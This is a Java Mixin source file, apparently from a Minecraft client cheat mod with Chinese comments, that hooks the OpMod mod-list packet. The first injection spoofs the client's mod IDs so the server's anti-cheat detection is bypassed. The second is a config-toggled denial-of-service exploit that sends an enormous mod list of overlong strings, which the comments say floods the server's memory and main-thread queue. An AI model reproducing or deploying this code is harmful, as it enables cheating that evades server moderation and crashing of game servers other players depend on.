package fku.org.example.fku.mixin; /* water */

import fku.org.example.fku.config.OpmodBypassConfig;
import fku.org.example.fku.config.OpmodDosConfig;
import fku.org.example.fku.util.ModScanResult;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Pseudo;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
//绕过opmod的发包 功能 来自：Karucn / jks
//优化by：水是什么味道的，加入了列表对比，完全绕过opmod，不会播报了。

/**
 * 绕过 OpMod 的模组列表检测。
 *
 * 对比两个目录的 modId：
 *   列表1 = 客户端本地模组目录（可在 fku/opmod_bypass.json 中配置）
 *   列表2 = 服务器自动安装的模组目录（可在 fku/opmod_bypass.json 中配置）
 * 仅当某 mod 同时出现在两个目录中，且目录2 中该 mod 的出现次数 ≤ 目录1 的出现次数时，才伪装。
 * 如果目录2 中的出现次数严格大于目录1（即用户多装了副本），则保留真实 ID，不伪装。
 * 该功能由赛博教员实现
 */
@Pseudo
@Mixin(targets = "lbxrman.mymod.opmod.network.PacketSendModList", remap = false)
public abstract class MixinPacketSendModList {

    @Shadow private Set<String> modIds;

    /** 伪装用的候选 modId（轮询使用） */
    private static final String[] FAKE_MOD_IDS = {"netease_official", "opmod"};

    /** 默认目录1（回退值） */
    private static final String DEFAULT_DIR_1 = "D:\\MCLDownload\\cache\\game\\V_1_20\\mods";
    /** 默认目录2（回退值） */
    private static final String DEFAULT_DIR_2 = "D:\\MCLDownload\\Game\\.minecraft\\mods";

    /** mods.toml 中提取 modId 的正则 */
    private static final Pattern MODID_PATTERN = Pattern.compile("modId\\s*=\\s*\"([^\"]+)\"");

    /** 缓存：目录1 的扫描结果 */
    private static ModScanResult cachedResult1 = null;
    /** 缓存：目录2 的扫描结果 */
    private static ModScanResult cachedResult2 = null;

    @Inject(method = "<init>(Ljava/util/Set;)V", at = @At("RETURN"), remap = false)
    private void onInit(Set<String> originalModIds, CallbackInfo ci) {
        try {
            if (modIds == null) return;
            if (originalModIds == null || originalModIds.isEmpty()) return;

            // 从配置读取目录路径（读取失败时回退到默认 D 盘路径）
            String dir1 = DEFAULT_DIR_1;
            String dir2 = DEFAULT_DIR_2;
            try {
                OpmodBypassConfig cfg = OpmodBypassConfig.getInstance();
                dir1 = cfg.modsDir1;
                dir2 = cfg.modsDir2;
            } catch (Exception ignored) {}

            // 扫描两个目录
            ModScanResult result1 = scanModsDir(Paths.get(dir1));
            ModScanResult result2 = scanModsDir(Paths.get(dir2));

            // 遍历原始列表
            //   仅当 mod 同时存在于两个目录中，且目录2 的出现次数 ≤ 目录1 的出现次数 → 伪装
            //   如果目录2 的出现次数严格大于目录1（用户多装了副本），则保留真实 ID
            //   其余情况均保留真实 ID
            List<String> originalList = new ArrayList<>(originalModIds);
            Set<String> result = new TreeSet<>();
            int fakeIdx = 0;
            for (String id : originalList) {
                // 合并主 mod 与 jarjar 内嵌 mod 的总出现次数
                int count1 = result1.mainMods.getOrDefault(id, 0) + result1.jarjarMods.getOrDefault(id, 0);
                int count2 = result2.mainMods.getOrDefault(id, 0) + result2.jarjarMods.getOrDefault(id, 0);

                // 目录2 有该 mod 且目录2 的个数 ≤ 目录1 的个数 → 伪装
                boolean shouldSpoof = count2 > 0 && count2 <= count1;

                if (shouldSpoof) {
                    result.add(FAKE_MOD_IDS[fakeIdx % FAKE_MOD_IDS.length]);
                    fakeIdx++;
                } else {
                    result.add(id);
                }
            }

            // 替换原列表
            modIds.clear();
            modIds.addAll(result);
        } catch (Throwable t) {
            // 任何异常都不应阻断加入流程：保留原列表即可。
        }
    }

    /**
     * OpMod DoS 利用（巨型 mod 列表攻击）。
     * 在伪装逻辑（onInit）执行完之后追加：当 opmod_dos.json 中 modListAttack 开启时，
     * 把 modIds 替换为一个“自报 size 巨大 + 单条字符串超长”的集合，
     * 服务端 decode 会按客户端自报的 size 预分配几十 MB 的 TreeSet，
     * 且每个包都会被 enqueueWork 推入主线程队列做差集 + 全服广播，形成无界队列堆积 → DoS。
     * 默认关闭，手动改 opmod_dos.json 才生效；不动原有伪装逻辑。
     */
    @Inject(method = "<init>(Ljava/util/Set;)V", at = @At("RETURN"), remap = false)
    private void onInitAttack(Set<String> originalModIds, CallbackInfo ci) {
        try {
            OpmodDosConfig cfg = OpmodDosConfig.getInstance();
            if (cfg == null || !cfg.modListAttack) return;
            if (modIds == null) return;

            int size = Math.max(1, cfg.modListSize);
            int strLen = Math.max(1, cfg.modListStringLen);
            StringBuilder sb = new StringBuilder(strLen);
            for (int i = 0; i < strLen; i++) sb.append((char) ('a' + (i % 26)));
            String base = sb.toString();

            Set<String> attack = new TreeSet<>();
            for (int i = 0; i < size; i++) {
                attack.add(base + "_" + i);
            }
            modIds.clear();
            modIds.addAll(attack);
        } catch (Throwable t) {
            // 不阻断正常流程
        }
    }

    /**
     * 扫描指定目录下的 .jar 文件，提取所有 modId（含 jarjar 内嵌），返回分离的扫描结果
     */
    private static ModScanResult scanModsDir(Path dir) {
        // 用目录路径做缓存键，各自缓存独立判空
        String dirKey = dir.toAbsolutePath().normalize().toString();
        if (dirKey.contains("cache") && cachedResult1 != null) return cachedResult1;
        if (dirKey.contains("minecraft") && cachedResult2 != null) return cachedResult2;

        ModScanResult result = new ModScanResult();
        if (!Files.isDirectory(dir)) return result;

        try (DirectoryStream<Path> stream = Files.newDirectoryStream(dir, "*.jar")) {
            for (Path jarPath : stream) {
                try {
                    // 提取所有主 modId（mods.toml 中可能有多个 [[mods]] 条目）
                    Set<String> mainModIds = extractAllModIdsFromJar(jarPath);
                    for (String mid : mainModIds) {
                        result.mainMods.merge(mid, 1, Integer::sum);
                    }
                    // 提取 jarjar 内嵌 modId（单独存储，不参与重复计数）
                    Map<String, Integer> jarjarMods = extractJarjarModIds(jarPath);
                    for (Map.Entry<String, Integer> e : jarjarMods.entrySet()) {
                        result.jarjarMods.merge(e.getKey(), e.getValue(), Integer::sum);
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}

        // 缓存结果
        if (dirKey.contains("cache")) cachedResult1 = result;
        if (dirKey.contains("minecraft")) cachedResult2 = result;
        return result;
    }

    /**
     * 从 .jar 文件中读取 META-INF/mods.toml，提取所有 [[mods]] 下的 modId
     * （一个 mods.toml 中可能包含多个 [[mods]] 条目，如 setcommandblock + filterdetector）
     */
    private static Set<String> extractAllModIdsFromJar(Path jarPath) {
        Set<String> result = new HashSet<>();
        try (JarFile jar = new JarFile(jarPath.toFile())) {
            JarEntry entry = jar.getJarEntry("META-INF/mods.toml");
            if (entry == null) return result;

            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(jar.getInputStream(entry), StandardCharsets.UTF_8))) {
                String line;
                boolean inModsSection = false;
                while ((line = reader.readLine()) != null) {
                    String trimmed = line.trim();
                    // 进入 [[mods]] 区块
                    if (trimmed.startsWith("[[mods]]")) {
                        inModsSection = true;
                        continue;
                    }
                    // 进入其他区块（[[dependencies.xxx]] 等），退出 mods 模式
                    if (trimmed.startsWith("[[")) {
                        inModsSection = false;
                    }
                    if (inModsSection) {
                        Matcher m = MODID_PATTERN.matcher(trimmed);
                        if (m.find()) {
                            result.add(m.group(1));
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return result;
    }

    /**
     * 扫描 jar 内 META-INF/jarjar/ 目录下的内嵌 jar，提取其 modId → 出现次数
     */
    private static Map<String, Integer> extractJarjarModIds(Path jarPath) {
        Map<String, Integer> result = new HashMap<>();
        try (JarFile jar = new JarFile(jarPath.toFile())) {
            // 收集所有 jarjar 条目
            List<JarEntry> jarjarEntries = new ArrayList<>();
            Enumeration<JarEntry> entries = jar.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String name = entry.getName();
                if (name.startsWith("META-INF/jarjar/") && name.endsWith(".jar") && !entry.isDirectory()) {
                    jarjarEntries.add(entry);
                }
            }

            // 解析每个 jarjar 内嵌 jar
            for (JarEntry jarjarEntry : jarjarEntries) {
                try (InputStream is = jar.getInputStream(jarjarEntry);
                     JarInputStream jis = new JarInputStream(is)) {
                    JarEntry inner;
                    boolean inModsSection = false;
                    while ((inner = jis.getNextJarEntry()) != null) {
                        if (inner.getName().equals("META-INF/mods.toml")) {
                            BufferedReader reader = new BufferedReader(
                                    new InputStreamReader(jis, StandardCharsets.UTF_8));
                            String line;
                            while ((line = reader.readLine()) != null) {
                                String trimmed = line.trim();
                                if (trimmed.startsWith("[[mods]]")) {
                                    inModsSection = true;
                                    continue;
                                }
                                if (trimmed.startsWith("[[")) {
                                    inModsSection = false;
                                }
                                if (inModsSection) {
                                    Matcher m = MODID_PATTERN.matcher(trimmed);
                                    if (m.find()) {
                                        String modId = m.group(1);
                                        if (modId != null && !modId.isEmpty()) {
                                            result.merge(modId, 1, Integer::sum);
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
        return result;
    }
}